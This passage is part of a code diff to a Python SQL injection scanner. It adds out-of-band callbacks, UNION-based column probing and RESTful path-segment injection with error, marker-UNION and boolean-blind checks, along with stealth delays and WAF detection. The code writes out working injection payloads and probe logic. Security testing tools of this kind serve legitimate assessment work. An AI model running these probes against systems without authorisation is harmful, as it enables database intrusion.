+            self._cb(f"[{param_name}] TIME-BASED BLIND test (may take a few seconds)")
             time_result = self._test_time_based_blind(url, param_name)
             time_result["parameter"] = param_name
             result["tests"].append(time_result)
             if time_result.get("vulnerable", False):
+                self._cb(
+                    f"[{param_name}] time-based CONFIRMED "
+                    f"({time_result.get('confidence', 'high')})"
+                )
                 param_score += (
                     3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                 )
 
             # ── [NEW-6] Stacked-query probe ───────────────────────────────────
+            self._cb(f"[{param_name}] STACKED-QUERY PROBE")
             stacked_result = self._test_stacked_query(
                 url, param_name, baseline_content, baseline_status
             )
             stacked_result["parameter"] = param_name
             result["tests"].append(stacked_result)
             if stacked_result["vulnerable"]:
+                self._cb(f"[{param_name}] stacked-query signal (LOW confidence)")
                 param_score += 1  # LOW confidence signal only
+
+            # ── [6] Out-of-band (OAST) — opt-in, CRITICAL on hit ─────────────
+            if self.oast is not None:
+                oob_result = self._test_oob(url, param_name)
+                oob_result["parameter"] = param_name
+                result["tests"].append(oob_result)
+                if oob_result["vulnerable"]:
+                    # An OOB callback is definitive — short-circuit as CRITICAL.
+                    result["vulnerable"]         = True
+                    result["overall_confidence"] = SQLiConfidence.CRITICAL.value
+                    result["message"]            = f"Tested {len(params)} parameter(s)"
+                    return result
 
             if param_score > 0:
                 per_param_scores.append(param_score)
@@ -1962,6 +2450,36 @@ class SQLiDetector:
                         confidence_scores.append(2)
                         break
 
+            # ── ORDER-BY-guided UNION (opt-in; see test_write_union) ─────────
+            if self.test_write_union:
+                def _post_send(p, _pn=param_name):
+                    return self._post(
+                        url, data={**post_data, _pn: str(post_data[_pn]) + p}
+                    )
+                u = self._union_via(_post_send)
+                if u["vulnerable"]:
+                    u["parameter"] = param_name
+                    result["tests"].append(u)
+                    result["vulnerable"] = True
+                    confidence_scores.append(
+                        3 if u["confidence"] == SQLiConfidence.HIGH.value else 1
+                    )
+
+            # ── Out-of-band (OAST) — always on when a provider is set ────────
+            if self.oast is not None:
+                def _post_send_oob(p, _pn=param_name):
+                    return self._post(
+                        url, data={**post_data, _pn: str(post_data[_pn]) + p}
+                    )
+                oob = self._oob_via(_post_send_oob, f"POST {param_name}")
+                if oob["vulnerable"]:
+                    oob["parameter"] = param_name
+                    result["tests"].append(oob)
+                    result["vulnerable"]         = True
+                    result["overall_confidence"] = SQLiConfidence.CRITICAL.value
+                    result["message"] = f"Tested {len(post_data)} POST parameter(s)"
+                    return result
+
             if self.stealth:
                 _interruptible_sleep(random.uniform(2, 4))
 
@@ -2076,6 +2594,36 @@ class SQLiDetector:
                         confidence_scores.append(2)
                         break
 
+            # ── ORDER-BY-guided UNION (opt-in; see test_write_union) ─────────
+            if self.test_write_union:
+                def _json_send(p, _k=key):
+                    return self._post(
+                        url, json_body={**json_data, _k: str(json_data[_k]) + p}
+                    )
+                u = self._union_via(_json_send)
+                if u["vulnerable"]:
+                    u["parameter"] = key
+                    result["tests"].append(u)
+                    result["vulnerable"] = True
+                    confidence_scores.append(
+                        3 if u["confidence"] == SQLiConfidence.HIGH.value else 1
+                    )
+
+            # ── Out-of-band (OAST) — always on when a provider is set ────────
+            if self.oast is not None:
+                def _json_send_oob(p, _k=key):
+                    return self._post(
+                        url, json_body={**json_data, _k: str(json_data[_k]) + p}
+                    )
+                oob = self._oob_via(_json_send_oob, f"JSON {key}")
+                if oob["vulnerable"]:
+                    oob["parameter"] = key
+                    result["tests"].append(oob)
+                    result["vulnerable"]         = True
+                    result["overall_confidence"] = SQLiConfidence.CRITICAL.value
+                    result["message"] = "JSON injection test completed"
+                    return result
+
             if self.stealth:
                 _interruptible_sleep(random.uniform(2, 4))
 
@@ -2093,35 +2641,263 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  Path-based entry point
+    #  Path-based entry point — segment injection helpers
+    # ──────────────────────────────────────────────────────────
+
+    def _path_injectable_segments(self, url: str) -> Tuple[List[int], List[str]]:
+        """
+        Return (candidate_indices, segments) for RESTful path-parameter injection.
+
+        Numeric segments (e.g. /user/75/profile → '75') are the primary attack
+        surface and are returned in path order. If there is no numeric segment,
+        the last purely-alphanumeric segment is used as a single fallback
+        candidate. segments is the raw path.split('/') list (index 0 is '').
+        """
+        parsed   = urlparse(url)
+        segments = parsed.path.split("/")
+        numeric: List[int] = [
+            i for i, seg in enumerate(segments) if seg and seg.isdigit()
+        ]
+        if numeric:
+            return numeric, segments
+
+        for i in range(len(segments) - 1, -1, -1):
+            if segments[i] and re.fullmatch(r"\w+", segments[i]):
+                return [i], segments
+        return [], segments
+
+    def _inject_path_segment(self, url: str, seg_index: int, payload: str) -> str:
+        """Rebuild url with path segment seg_index replaced by payload (query/fragment preserved)."""
+        parsed   = urlparse(url)
+        segments = parsed.path.split("/")
+        if seg_index < 0 or seg_index >= len(segments):
+            return url
+        segments[seg_index] = payload
+        rebuilt = f"{parsed.scheme}://{parsed.netloc}{'/'.join(segments)}"
+        if parsed.query:
+            rebuilt += f"?{parsed.query}"
+        if parsed.fragment:
+            rebuilt += f"#{parsed.fragment}"
+        return rebuilt
+
+    # ──────────────────────────────────────────────────────────
+    #  Path-based — upgraded: error + marker-UNION + boolean differential
     # ──────────────────────────────────────────────────────────
 
     def test_path_based_sqli(self, url: str) -> Dict:
-        """Test path-based SQLi by appending a quote to numeric/word path segments."""
+        """
+        Test RESTful path parameters for SQL injection.
+
+        Previous version only appended a single quote to the end of the URL and
+        matched error signatures. It missed mid-path numeric IDs (the common
+        /user/75/profile shape) and anything that wasn't a verbose DB error.
+
+        This version reuses the same discipline as the query-parameter suite:
+          1. error-based   — quote injection, guarded by the baseline-error check
+                             ([FP-2]) so a page that already emits SQL errors on
+                             the clean request can't produce a false positive.
+          2. marker-UNION  — a random marker reflected verbatim (status matched)
+                             is low-noise HIGH-confidence proof the UNION ran.
+          3. boolean diff  — AND 1=1 / AND 1=2 on normalized, status-matched
+                             bodies, dual-metric (length + similarity) + one
+                             confirmation round, gated by page stability ([FP-1]).
+
+        Each candidate path segment is tested in order; the first HIGH result
+        short-circuits. All anti-FP guards from the GET suite are preserved.
+        """
         result = {
             "method":     "path_based",
             "vulnerable": False,
             "confidence": SQLiConfidence.NONE.value,
             "evidence":   [],
+            "waf":        None,
         }
         if self.circuit_breaker.is_dead(url):
             return result
 
-        path = urlparse(url).path
-        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
-            response = self._get(url + "'")
-            if response:
-                waf = self._detect_waf(response)
-                if waf:
-                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
-                    return result
+        candidates, segments = self._path_injectable_segments(url)
+        if not candidates:
+            return result
 
-                match = self._match_sql_errors(response.text)
-                if match:
-                    db_type, pattern = match
-                    result["vulnerable"] = True
-                    result["confidence"] = SQLiConfidence.HIGH.value
-                    result["evidence"].append(
-                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
-                    )
+        # Clean baseline for this URL (status + normalized body).
+        base_resp = self._get(url)
+        if base_resp is None:
+            return result
+        baseline_status  = base_resp.status_code
+        baseline_body    = base_resp.text
+        norm_baseline    = _normalize_dynamic(baseline_body)
+        baseline_len     = len(norm_baseline)
+
+        waf0 = self._detect_waf(base_resp)
+        if waf0:
+            result["waf"] = waf0
+            result["evidence"].append(f"WAF detected ({waf0}) on baseline — path-based skipped")
+            return result
+
+        # [FP-2] If the clean page already shows SQL errors, error-based is
+        # unreliable here → disable only that signal, keep marker/boolean.
+        baseline_dirty = self._match_sql_errors(baseline_body) is not None
+
+        # [FP-1] Page stability governs whether boolean differential may run.
+        page_stability  = self._check_page_stability(url)
+        boolean_allowed = page_stability >= _PAGE_STABILITY_MIN
+
+        for seg_index in candidates:
+            if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
+                break
+
+            seg_label = f"path[{seg_index}]={segments[seg_index]}"
+            base_val  = segments[seg_index]
+
+            # ── 1. Error-based ───────────────────────────────────────────────
+            if not baseline_dirty:
+                r_err = self._get(self._inject_path_segment(url, seg_index, base_val + "'"))
+                if r_err is not None:
+                    waf = self._detect_waf(r_err)
+                    if waf:
+                        result["waf"] = waf
+                        result["evidence"].append(f"WAF detected ({waf}): error-based skipped on {seg_label}")
+                    else:
+                        match = self._match_sql_errors(r_err.text)
+                        if match:
+                            db_type, pattern = match
+                            result["vulnerable"] = True
+                            result["confidence"] = SQLiConfidence.HIGH.value
+                            result["evidence"].append(
+                                f"Path-based error SQLi on {seg_label}: "
+                                f"{db_type.upper()} — {pattern[:60]}"
+                            )
+                            return result
+            else:
+                result["evidence"].append(
+                    f"[FP-guard] baseline already emits SQL errors — "
+                    f"path error-based skipped on {seg_label}"
+                )
+
+            # ── 2. Marker-based UNION ────────────────────────────────────────
+            marker = f"dkeyz{random.randint(10**6, 10**7 - 1)}xqz"
+            union_hit = False
+            for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
+                if self.circuit_breaker.is_dead(url) or _exit_requested or _skip_current:
+                    break
+                str_cols = ",".join([f"'{marker}'"] * n_cols)
+                for payload in (
+                    f"{base_val} UNION SELECT {str_cols}-- -",
+                    f"-1 UNION SELECT {str_cols}-- -",
+                ):
+                    r_u = self._get(self._inject_path_segment(url, seg_index, payload))
+                    if r_u is None:
+                        continue
+                    waf = self._detect_waf(r_u)
+                    if waf:
+                        result["waf"] = waf
+                        break
+                    # marker reflected verbatim + status unchanged = confirmed
+                    if marker in r_u.text and r_u.status_code == baseline_status:
+                        result["vulnerable"] = True
+                        result["confidence"] = SQLiConfidence.HIGH.value
+                        result["evidence"].append(
+                            f"Path-based UNION marker '{marker}' reflected on "
+                            f"{seg_label} at n={n_cols} columns"
+                        )
+                        return result
+                    sql_match = self._match_sql_errors(r_u.text)
+                    if sql_match and not baseline_dirty:
+                        db_type, pattern = sql_match
+                        result["vulnerable"] = True
+                        result["confidence"] = SQLiConfidence.HIGH.value
+                        result["evidence"].append(
+                            f"Path-based UNION triggered {db_type.upper()} "
+                            f"error on {seg_label} at n={n_cols}: {pattern[:50]}"
+                        )
+                        return result
+                if union_hit:
+                    break
+
+            # ── 3. Boolean differential (stability-gated) ────────────────────
+            if not boolean_allowed:
+                result["evidence"].append(
+                    f"[FP-guard] boolean path test skipped on {seg_label} — "
+                    f"page stability {page_stability:.2f} < {_PAGE_STABILITY_MIN}"
+                )
+                continue
+
+            bool_sig = self._path_boolean_signal(
+                url, seg_index, base_val, norm_baseline, baseline_len, baseline_status
+            )
+            if bool_sig is not None:
+                confidence, evidence = bool_sig
+                result["vulnerable"] = True
+                # Never downgrade an already-set higher confidence.
+                if result["confidence"] == SQLiConfidence.NONE.value:
+                    result["confidence"] = confidence
+                result["evidence"].append(f"{seg_label}: {evidence}")
+
         return result
+
+    def _path_boolean_signal(self, url: str, seg_index: int, base_val: str,
+                             norm_baseline: str, baseline_len: int,
+                             baseline_status: int) -> Optional[Tuple[str, str]]:
+        """
+        Dual-metric boolean-blind differential for a single path segment.
+
+        Mirrors _test_boolean_blind's discipline in compact form: status-matched
+        + dynamic-noise-normalized bodies, requires BOTH a length differential
+        (>15% baseline) AND a similarity differential (>0.05) between the TRUE
+        (AND 1=1) and FALSE (AND 1=2) responses, then one confirmation round.
+        Returns (confidence, evidence) or None.
+        """
+        true_payloads  = [f"{base_val} AND 1=1", f"{base_val} AND 1=1-- -"]
+        false_payloads = [f"{base_val} AND 1=2", f"{base_val} AND 1=2-- -"]
+
+        def _sample(payload: str) -> Optional[Tuple[int, float]]:
+            r = self._get(self._inject_path_segment(url, seg_index, payload))
+            if r is None or r.status_code != baseline_status:
+                return None
+            norm = _normalize_dynamic(r.text)
+            b1   = norm_baseline[:_PROBE_SAMPLE_BYTES]
+            b2   = norm[:_PROBE_SAMPLE_BYTES]
+            sim  = difflib.SequenceMatcher(None, b1, b2).ratio()
+            return (len(norm), sim)
+
+        true_lens:  List[int]   = []
+        true_sims:  List[float] = []
+        false_lens: List[int]   = []
+        false_sims: List[float] = []
+
+        for p in true_payloads:
+            if _exit_requested or _skip_current:
+                return None
+            s = _sample(p)
+            if s:
+                true_lens.append(s[0]); true_sims.append(s[1])
+        for p in false_payloads:
+            if _exit_requested or _skip_current:
+                return None
+            s = _sample(p)
+            if s:
+                false_lens.append(s[0]); false_sims.append(s[1])
+
+        if not true_lens or not false_lens:
+            return None
+
+        len_diff = abs(statistics.median(true_lens) - statistics.median(false_lens))
+        sim_diff = abs(statistics.median(true_sims) - statistics.median(false_sims))
+
+        if not (len_diff > baseline_len * 0.15 and sim_diff > 0.05):
+            return None
+
+        # Confirmation round — reproducibility guard against one-off churn.
+        c_true  = _sample(true_payloads[0])
+        c_false = _sample(false_payloads[0])
+        if c_true and c_false and abs(c_true[0] - c_false[0]) > baseline_len * 0.10:
+            return (
+                SQLiConfidence.MEDIUM.value,
+                f"boolean path diff confirmed: Δlen={len_diff:.0f}B "
+                f"sim_diff={sim_diff:.3f}",
+            )
+        return (
+            SQLiConfidence.LOW.value,
+            f"boolean path diff passed but confirm inconclusive: "
+            f"Δlen={len_diff:.0f}B sim_diff={sim_diff:.3f} — LOW",
+        )
